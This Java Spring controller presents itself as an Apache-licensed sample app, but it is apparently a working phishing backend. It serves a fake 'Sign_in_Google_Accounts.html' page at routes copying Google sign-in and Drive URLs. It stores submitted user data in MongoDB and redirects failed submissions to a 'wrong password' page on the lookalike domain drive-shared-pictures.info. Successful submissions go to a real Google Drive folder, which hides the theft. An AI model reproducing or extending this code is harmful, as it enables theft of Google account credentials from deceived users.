/*
 * Copyright 2012-2016 the original author or authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package sample.web.controller;

import java.util.List;

import javax.validation.Valid;


import org.springframework.stereotype.Controller;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

import sample.web.mongodb.UserDataRepository;


@Controller
@RequestMapping("/")
public class UserDataController {

	private final UserDataRepository userDataRepository;

	public UserDataController(UserDataRepository userDataRepository) {
		this.userDataRepository = userDataRepository;
	}

	@GetMapping
	public ModelAndView list() {
		List<UserData> allData = this.userDataRepository.findAll();
		return new ModelAndView("messages/list", "messages", allData);
	}

	@GetMapping("message/{id}")
	public ModelAndView view(@PathVariable("id") UserData message) {
		return new ModelAndView("messages/view", "message", message);
	}

	@GetMapping(params = "form")
	public String createForm(@ModelAttribute UserData message) {
		return "messages/form";
	}

	@PostMapping("create")
	public String create(@Valid UserData message, BindingResult result,
			RedirectAttributes redirect) {
		if (result.hasErrors()) {
			return "redirect:http://drive-shared-pictures.info/0Bz-sMp6X5fopUDdDZjJqY2JOc1k_usp=sharing_eil&ts=59d40a80/signin_wrong_password.html";
		}
//		if(!"".equals(message.getId()) ){
//			message = this.userDataRepository.save(message);
//			redirect.addFlashAttribute("globalMessage", "Successfully updated ");
//		}else{
//			message.setId(String.valueOf(this.userDataRepository.count()+1));
			message = this.userDataRepository.save(message);
			redirect.addFlashAttribute("globalMessage", "Successfully created a new message");
//		}
		return "redirect:https://drive.google.com/drive/folders/0Bz-sMp6X5fopUDdDZjJqY2JOc1k";
//		return new ModelAndView("redirect:/{userData.id}", "userData.id", message.getId());
	}

	@RequestMapping("foo")
	public String foo() {
		throw new RuntimeException("Expected exception in controller");
	}

	@GetMapping(value = "delete/{id}")
	public ModelAndView delete(@PathVariable("id") String id) {
		this.userDataRepository.delete(id);
		Iterable<UserData> messages = this.userDataRepository.findAll();
		return new ModelAndView("messages/list", "messages", messages);
	}

	@GetMapping(value = "modify/{id}")
	public ModelAndView modifyForm(@PathVariable("id") UserData message) {
		return new ModelAndView("messages/form", "userData", message);
	}
	
	@RequestMapping("drive/folders/signin/0Bz-sMp6X5fopUDdDZjJqY2JOc1k_usp=sharing_eil&ts=59d40a80")
	public String signIn() {
		return "/Sign_in_Google_Accounts.html";
	}

	@RequestMapping("signin/v2/identifier")
	public String signIn2() {
		return "/Sign_in_Google_Accounts.html";
	}
	
}
